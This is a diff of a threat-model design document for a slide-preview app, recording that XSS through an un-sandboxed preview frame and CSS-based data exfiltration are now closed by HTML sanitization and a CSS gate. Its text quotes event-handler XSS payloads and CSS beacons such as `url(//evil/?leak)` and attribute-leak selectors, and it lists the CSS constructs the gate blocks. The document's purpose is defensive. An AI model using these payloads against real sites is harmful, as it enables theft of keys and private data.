@@ -115,6 +115,15 @@ declarative side actually inert) are distinct, and both must be answered.
 
 ### 5.1 Already exploitable TODAY — the preconditions (no transformer change needed)
 
+> **STATUS — both preconditions CLOSED (#616).** T-CONTENT is closed by a single
+> upstream HTML sanitizer (`docs/src/lib/sanitize-slide-html.js`, DOMPurify) applied
+> at every preview-frame builder, so script-bearing content can no longer execute in
+> the same-origin frame; chart SVG / MathML / `url()` backgrounds / `<del>`-`<ins>`
+> survive. T-CSS is closed by `findCssExfil` in `lib/layout/gate.js`, which blocks
+> `@import`, remote `url()`, `expression()`, `-moz-binding`, and `javascript:`/`vbscript:`
+> in component CSS (inline `data:`/`#fragment` still allowed). Declarative component
+> sharing / AI-generation is now safe to build on. The original analysis is kept below.
+
 The trust-boundary shift in §3 makes two *existing* surfaces exploitable with the
 current declarative-only components. These are **not** "adjacent, track-later" items:
 they are the reason the §6 decision's safety claim is conditional, and they are the
@@ -126,14 +135,21 @@ same severity as T2.
   un-sandboxed `srcdoc` frame (§2). A shared or AI-generated skeleton with
   `<img src=x onerror=…>` / `<svg onload=…>` therefore **executes in the app origin
   on import/preview and can read the OpenRouter key** — with zero transformer. This is
-  T2's impact, reachable now. Tracked: **#616**.
+  T2's impact, reachable now. **Closed (#616):** every preview-frame builder now runs the
+  rendered HTML through `sanitizeSlideHtml` (`docs/src/lib/sanitize-slide-html.js`,
+  DOMPurify) before the `srcdoc`, stripping scripts/handlers/dangerous URLs while
+  preserving legitimate chart SVG, MathML, and inline-`style` `url()` backgrounds.
 - **T-CSS — exfiltration via designer CSS.** `gateCss` (`layout-core.generated.js`)
   enforces only three things: non-empty, no hex literals, selector scoped to `.name`.
   It does **not** block `@import`, `url(...)`, legacy `expression()`, `-moz-binding`,
   or `javascript:`. So shared designer CSS is a live exfiltration channel — a
   `background:url(//evil/?leak)` beacon, or attribute-leak selectors
   (`[value^="a"]{background:url(//evil/a)}`) — defeating the on-device confidentiality
-  goal (Asset #3) with no script at all. Tracked: **#616**.
+  goal (Asset #3) with no script at all. **Closed (#616):** `findCssExfil` in
+  `lib/layout/gate.js` now flags `@import`, remote `url()`, `expression()`,
+  `-moz-binding`, and `javascript:`/`vbscript:` as blocking gate errors; inline
+  `data:` URIs and `#fragment` refs (non-network) stay allowed so the legit
+  inline-icon pattern survives.
 
 ## 6. Decision
 
@@ -202,13 +218,16 @@ preconditions (#616) closed first — a JS isolate is moot while raw-HTML and CS
 The §5.1 content/CSS holes are **preconditions** (above, #616), not "adjacent". What
 *is* genuinely adjacent:
 
-- **The preview-frame fix is non-trivial.** The remediation for T-CONTENT is *not*
-  "wrap it in an iframe" — it already is one (`single-slide-render.ts:222`). The fix
-  is to **add a `sandbox` attribute (dropping `allow-same-origin`)** on the
-  untrusted-content path — which **breaks the deliberate same-origin runtime-`<script>`
-  injection** the trusted self-authored preview relies on. So #616 likely needs a
-  *split*: a trusted self-authored preview (today's same-origin frame) vs an untrusted
-  (shared/AI) preview that is sandboxed and/or HTML-sanitized.
+- **The preview-frame fix — resolved by sanitizing CONTENT, not splitting the frame.**
+  The remediation for T-CONTENT is *not* "wrap it in an iframe" — it already is one
+  (`single-slide-render.ts:222`). Sandboxing the frame (dropping `allow-same-origin`)
+  would **break the deliberate same-origin runtime-`<script>` injection** every preview
+  relies on, which is why this section first sketched a trusted/untrusted frame *split*.
+  #616 instead took the simpler, equivalent route the split's "and/or HTML-sanitized"
+  arm allowed: a single upstream `sanitizeSlideHtml` at every frame builder strips the
+  script-bearing content uniformly, so the frame stays same-origin (runtime injection
+  intact) and no trust flag has to be threaded through the render path. Sanitizing is a
+  no-op on legitimate decks, so no exported artifact's bytes change.
 - **Zip-slip / path traversal on import.** Not exploitable on today's web import
   (`asset-bundle.ts` reads entries by manifest name into the asset store, no disk write
   by path), but the manifest's `css`/`skeleton` **path** fields are attacker-controlled,
